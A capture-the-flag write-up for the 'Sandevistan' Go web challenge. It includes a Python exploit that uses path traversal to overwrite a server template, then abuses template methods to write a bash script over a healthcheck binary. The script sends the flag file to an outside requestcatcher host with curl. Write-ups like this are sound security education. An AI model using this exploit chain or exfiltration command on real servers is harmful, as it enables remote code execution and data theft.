https://ctftime.org/event/2479

# Sandevistan (Web)

Go web chall

## Solution

You overwrite a template then you need to find some useful gadget on `user` or `cyberware` to get the flag.
There is a healthcheck function that calls `/bin/true`.
So the idea is to overwrite that with something.
But that doesn't work because the file will start with `ERROR ...` and not run.
`NewError` plus `SerializeErrors` allows us to write to any offset in a file.
So we just do that.

```python
import requests
import urllib


REMOTE = "http://sandevistan.chal.perfect.blue:28418/"

# create user
res = requests.post(
    REMOTE + "user",
    data="username=xad",
)

bin = (
    """{{ .NewError "asdsadasd" "/bin/true" }}
rs -> {{ range $index, $value := .Errors }}{{ $index }} - {{ $value }}\n{{ end }}
alize -> {{ .SerializeErrors "#!/bin/bash\\ncurl https://lalalalalallalala.requestcatcher.com/ -d @/flag\\n" 0 0 }}
thcheck ->  {{ .UserHealthcheck }}"""
    + " " * 2000
)
bin = urllib.parse.quote_plus(bin)
res = requests.post(
    REMOTE + "cyberware",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    data=f"username=../tmpl/user.html&name={bin}",
)

# get user, new template
res = requests.get(
    REMOTE + "user",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    data="username=xad",
)
```

## Flag
`bwctf{YoU_kNoW_yOu_d1dnt_l0s3_Ur_53Lf-coNtR0L._LEt'5_start_at_the_r4inB0w}`

shafouz - 2024/10/13
